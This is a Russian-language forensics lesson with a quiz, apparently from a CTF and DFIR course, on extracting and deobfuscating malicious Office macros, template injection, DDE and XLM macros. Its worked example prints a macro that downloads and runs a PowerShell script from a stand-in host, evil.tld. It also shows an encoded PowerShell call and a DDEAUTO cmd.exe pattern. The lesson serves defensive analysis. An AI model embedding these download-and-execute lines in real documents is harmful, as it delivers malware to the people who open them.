---
id: forensics-office-macros
title: "Форензика Office-документов и макросов"
category: forensics
parent: forensics-email
difficulty: medium
order: 1
tags: [office, macro, vba, olevba, ole, docx, malware, phishing]
prerequisites: [forensics-email, forensics-file-magic]
useful_for:
  - "CTF Forensics категория"
  - "DFIR / Incident Response"
  - "Анализ фишинга"
estimated_minutes: 50
summary: "Разбор документов Office (docm/xlsm/docx): OLE-структура, извлечение и деобфускация VBA-макросов (olevba), встроенные объекты, шаблоны-приманки и индикаторы фишинга."
---
Office-документы — один из главных векторов фишинга: макросы (VBA), встроенные объекты, эксплойты, внешние шаблоны. Разбор такого документа отвечает на вопросы: что исполнялось, куда обращалось, что загружалось. Этот урок — про структуру OLE/OOXML, извлечение и деобфускацию макросов, встроенные объекты и индикаторы фишинга.

## Форматы: OLE и OOXML

| Формат | Тип | Расширения |
|--------|-----|-----------|
| OLE (Compound File Binary) | бинарный контейнер | `.doc`, `.xls`, `.ppt`, `.docm` (частично) |
| OOXML (ZIP) | XML в ZIP | `.docx`, `.xlsx`, `.pptx`, `.docm`, `.xlsm` |
| RTF | текст с OLE-объектами | `.rtf` |

**OLE** — контейнер с потоками (streams), как мини-ФС внутри файла. **OOXML** — обычный ZIP с XML-частями; макросы лежат в `word/vbaProject.bin`. Важное: файл с расширением `.docx` (без макросов) может содержать `vbaProject.bin`, если его переименовали — проверяйте содержимое, а не расширение.

```bash
$ file invoice.doc
invoice.doc: Composite Document File V2 Document, ... (OLE)
$ file invoice.docx
invoice.docx: Microsoft Word 2007+ (ZIP)
$ unzip -l invoice.docx | grep -iE 'vba|macro|oleObject|embeddings'
```

## Извлечение макросов: olevba и oledump

```bash
$ olevba invoice.docm
VBA MACRO ThisDocument.cls
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Sub AutoOpen()
    Shell "powershell -enc SQBFAFgA..."
End Sub
```

```bash
$ olevba --decode --deobf invoice.docm      # декодировать/деобфусцировать
$ olevba -a invoice.docm                     # анализ всех потоков
$ oledump.py invoice.docm -s 8 -d            # конкретный поток
$ oledump.py invoice.docm -i                # список потоков
$ mraptor invoice.docm                       # оценка «вредоносности» макроса
```

`olevba` распознаёт подозрительные вызовы (`Shell`, `WScript.Shell`, `CreateObject`, `AutoOpen`, `Document_Open`), декодирует `Chr()`/`StrReverse`/base64 и показывает IOC.

## OOXML вручную

```bash
$ unzip -o invoice.docx -d docx/
$ ls docx/word/
document.xml  vbaProject.bin  _rels/  embeddings/
$ python3 olevba docx/word/vbaProject.bin
# внешние связи (шаблон)
$ cat docx/word/_rels/settings.xml.rels
# встроенные объекты
$ file docx/word/embeddings/*
```

Частый приём — **template injection**: `settings.xml.rels` указывает на внешний шаблон (`TargetMode="External"`), который загружается при открытии и содержит макрос. Это позволяет обойти статический анализ (в документе макроса нет).

## Деобфускация VBA

Макросы обфусцируют: конкатенация строк, `Chr()`, `StrReverse`, base64, глобальные переменные, «мусорные» конструкции.

```bash
# olevba --deobf убирает часть обфускации
$ olevba --deobf --decode invoice.docm
# ручной разбор: найти Chr/StrReverse
$ grep -oE 'Chr\([0-9]+\)' macro.txt | head
# декодировать base64 из макроса
$ echo '<base64>' | base64 -d | iconv -f UTF-16LE -t UTF-8
```

Инструменты: `olevba`, `ViperMonkey` (эмуляция VBA), `pcodedmp` (P-код), `officeparser`. `ViperMonkey` исполняет макрос в песочнице и логирует поведение.

## Встроенные объекты и эксплойты

- **OLE-объекты** (`embeddings/`) — встроенные файлы (EXE, PDF), могут быть нагрузкой.
- **Эксплойты**: уязвимости в формулах (DDE), equation editor (CVE-2017-11882), OLE (CVE-2014-4114).
- **DDE**: `{DDEAUTO c:\\windows\\system32\\cmd.exe "/k ..."}` — выполнение без макросов.

```bash
$ grep -riE 'DDEAUTO|DDE ' docx/ | head
$ strings docx/word/embeddings/* | grep -iE 'http|cmd|powershell'
```

## Разобранный пример

Дан `invoice.docm`. Нужно извлечь макрос и IOC.

```bash
# 1. Тип и потоки
$ file invoice.docm && unzip -l invoice.docm | grep -i vba
# 2. Макрос
$ olevba invoice.docm
VBA MACRO Module1
Sub AutoOpen()
    Dim u As String: u = "http://evil.tld/p.ps1"
    Shell "powershell -w hidden IEX (New-Object Net.WebClient).DownloadString('" & u & "')"
End Sub
# 3. Деобфускация
$ olevba --deobf invoice.docm | grep -i http
# 4. IOC
$ olevba invoice.docm | grep -oE 'https?://[^ "]+' | sort -u
# 5. Встроенные объекты
$ unzip -o invoice.docm -d docm/ && file docm/word/embeddings/*
```

Итог: макрос `AutoOpen` загружает и исполняет PowerShell-скрипт с `evil.tld` — фишинг с fileless-нагрузкой.

## Справочная таблица

| Задача | Инструмент |
|--------|-----------|
| Макросы | `olevba`, `oledump` |
| Эмуляция VBA | `ViperMonkey` |
| P-код | `pcodedmp` |
| OOXML | `unzip` |
| Вредоносность | `mraptor` |
| Структура | `officeparser` |

## Частые ошибки

- **Верить расширению** — `.docx` может содержать макрос.
- **Смотреть только видимый текст** — макрос/объект скрыт.
- **Не проверять `settings.xml.rels`** — template injection.
- **Игнорировать `embeddings/`** — там встроенная нагрузка.
- **Не деобфусцировать** — `Chr()`/base64 скроют IOC.
- **Пропустить DDE** — выполнение без макросов.

## Что дальше / решение

Конвейер: `file`/`unzip -l` (структура) → `olevba`/`oledump` (макросы) → `--deobf` (обфускация) → `embeddings` (объекты) → IOC. Связка: `forensics-email` (доставка), `forensics-pdf` (PDF-нагрузки), `forensics-malware-yara` (YARA), `forensics-fileless` (PS).

## Эмуляция и динамический анализ

Статический разбор не всегда даёт полную картину (обфускация, вызовы API). Эмуляция макроса показывает реальное поведение без запуска Office.

```bash
# ViperMonkey: эмуляция VBA, лог поведения
$ vmonkey invoice.docm
# pcodedmp: дамп P-кода (скомпилированного VBA)
$ pcodedmp invoice.docm
# извлечь все строки из макроса
$ olevba --decode invoice.docm | grep -oE '"[^"]{4,}"' | head
```

ViperMonkey исполняет макрос в песочнице и выводит вызовы (`Shell`, `CreateObject`, `URLDownloadToFile`), URL и пути. Это безопаснее запуска в реальном Office.

## Извлечение и анализ встроенных объектов

```bash
$ unzip -o invoice.docx -d docx/
$ for f in docx/word/embeddings/*; do file "$f"; done
# вложенный OLE-объект разбираем как отдельный документ
$ olevba docx/word/embeddings/oleObject1.bin
$ sha256sum docx/word/embeddings/*
```

Встроенные объекты часто содержат вторую стадию (EXE, PDF, документ с макросом). Хешируйте и анализируйте их отдельно.

## Сводный чек-лист

1. `file` + `unzip -l` — определить формат и наличие `vbaProject.bin`.
2. `olevba`/`oledump` — извлечь макрос.
3. `--deobf --decode` — снять обфускацию.
4. `vmonkey`/`pcodedmp` — эмуляция/декомпиляция.
5. `settings.xml.rels` — проверить template injection.
6. `embeddings/` — извлечь встроенные объекты.
7. `grep` DDEAUTO/DDE — выполнение без макросов.
8. IOC: URL, IP, пути, хеши — в отчёт.

## Ограничения

- **Пароль на VBA-проект** (`vbaProject.bin` защищён) — обходится инструментами (`olevba` умеет).
- **P-код без исходника** — `pcodedmp` покажет скомпилированный код.
- **Внешний шаблон** — макрос вне документа; нужен доступ к URL.
- **Excel 4.0 (XLM) макросы** — `olevba` частично, нужны специализированные инструменты (`XLMMacroDeobfuscator`).
- **Онлайн-песочницы** — для сложных случаев (Any.run, Joe Sandbox).

## Excel 4.0 (XLM) макросы

Старый формат макросов Excel (XLM) снова популярен: он хранится в скрытых листах и не виден в обычном VBA-редакторе, а `olevba` показывает его лишь частично. XLM использует формулы-функции (`EXEC`, `CALL`, `REGISTER`, `URLMON`) для загрузки и запуска.

```bash
# извлечь XLM-макросы
$ python3 XLMMacroDeobfuscator.py --file invoice.xlsm
$ olevba -a invoice.xlsm | grep -iE 'EXEC|CALL|URLMON'
# скрытые листы
$ python3 -c "import xlrd;wb=xlrd.open_workbook('invoice.xls');print(wb.sheet_names())"
```

Признаки XLM-атаки: макрос-листы с именами вроде `Macro1`/`Auto_Open`, скрытые листы, формулы с `EXEC`/`URLMON`/`CALL`.

## OLE-структура в деталях

OLE-документ (`doc`/`xls`) — это мини-ФС: заголовок с сигнатурой `D0 CF 11 E0 A1 B1 1A E1`, FAT, каталог и потоки. Макрос лежит в потоке `Macros`/`VBA`. Понимание структуры помогает, когда инструменты не срабатывают.

```bash
$ xxd -l 8 invoice.doc
00000000: d0cf 11e0 a1b1 1ae1 ...   # OLE-сигнатура
$ oledump.py invoice.doc            # список потоков
$ oledump.py invoice.doc -s 8 -d    # дамп потока с макросом
```

## Сводка инструментов

| Инструмент | Задача |
|-----------|--------|
| `olevba` | макросы (VBA/XLM), декодирование |
| `oledump` | потоки OLE |
| `mraptor` | оценка вредоносности |
| `ViperMonkey` | эмуляция VBA |
| `pcodedmp` | P-код |
| `XLMMacroDeobfuscator` | XLM-макросы |
| `unzip` | OOXML |

## Практические приёмы

- **Двойное расширение** (`invoice.doc.js`) — проверяйте `file`.
- **Пароль на VBA-проект** — `olevba` обходит.
- **Template injection** — макрос во внешнем шаблоне (`settings.xml.rels`).
- **Вложенные объекты** — вторая стадия в `embeddings/`.
- **Формулы DDE** — выполнение без макросов.
- **Сравнение с эталоном** — если есть «чистая» версия документа, `diff` покажет добавленное.

## Квиз

```quiz
- question: "Какой инструмент извлекает и декодирует VBA-макросы?"
  options:
    - "olevba (oletools)"
    - "exiftool"
    - "binwalk"
    - "strings"
  answer: 0
- question: "Где в OOXML-документе лежит макрос?"
  options:
    - "word/document.xml"
    - "word/vbaProject.bin"
    - "word/_rels"
    - "[Content_Types].xml"
  answer: 1
- question: "Что такое remote template injection?"
  options:
    - "локальный макрос"
    - "загрузка удалённого шаблона, дающего выполнение без макроса в файле"
    - "шифрование документа"
    - "сжатие"
  answer: 1
- question: "Какой признак автозапуска макроса?"
  options:
    - "Auto_Open / Document_Open / Workbook_Open"
    - "SaveAs"
    - "Print"
    - "Close"
  answer: 0
- question: "Почему опасно открывать фишинговый документ в Office?"
  options:
    - "он станет больше"
    - "сработает макрос и выполнится вредоносный код"
    - "он удалится"
    - "ничего не произойдёт"
  answer: 1
```

## Где пригодится

- **CTF:** разбор документа-малвари и извлечение флага.
- **DFIR:** анализ фишинговых вложений и цепочки заражения.
- **Threat Hunting:** индикаторы (URL, шаблоны, DDE) для детекта.
- **SOC:** правила на макросы и remote template.
- **Судебная экспертиза:** доказательство факта открытия документа.
